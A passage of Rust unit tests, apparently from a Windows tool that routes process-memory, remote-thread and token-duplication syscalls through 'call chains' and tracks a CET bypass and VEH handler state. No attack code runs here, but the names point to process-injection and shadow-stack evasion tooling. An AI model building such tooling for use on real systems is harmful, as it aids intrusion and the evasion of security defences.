    }

    #[test]
    fn test_call_chain_registry() {
        // Verify that call chains exist for expected functions.
        assert!(CALL_CHAINS.contains_key("NtWriteVirtualMemory"));
        assert!(CALL_CHAINS.contains_key("NtReadVirtualMemory"));
        assert!(CALL_CHAINS.contains_key("NtAllocateVirtualMemory"));
        assert!(CALL_CHAINS.contains_key("NtOpenProcess"));
        assert!(CALL_CHAINS.contains_key("NtClose"));
        assert!(CALL_CHAINS.contains_key("NtQueryVirtualMemory"));
    }

    #[test]
    fn test_has_call_chain() {
        assert!(has_call_chain("NtWriteVirtualMemory"));
        assert!(has_call_chain("NtCreateThreadEx")); // Chain via CreateRemoteThreadEx
        assert!(has_call_chain("NtDuplicateToken")); // Chain via DuplicateTokenEx
        assert!(!has_call_chain("NtCreateFile")); // No chain registered
    }

    #[test]
    fn test_status_json_format() {
        let json = status_json();
        assert!(json.contains("\"cet_state\":"));
        assert!(json.contains("\"build\":"));
        assert!(json.contains("\"initialized\":"));
        assert!(json.contains("\"bypass_enabled\":"));
        assert!(json.contains("\"veh_installed\":"));
    }

    #[test]
    fn test_cet_state_constants() {
        assert_eq!(CET_DISABLED, 0);
        assert_eq!(CET_ENABLED_CAN_DISABLE, 1);
        assert_eq!(CET_ENABLED_CANNOT_DISABLE, 2);
    }
}
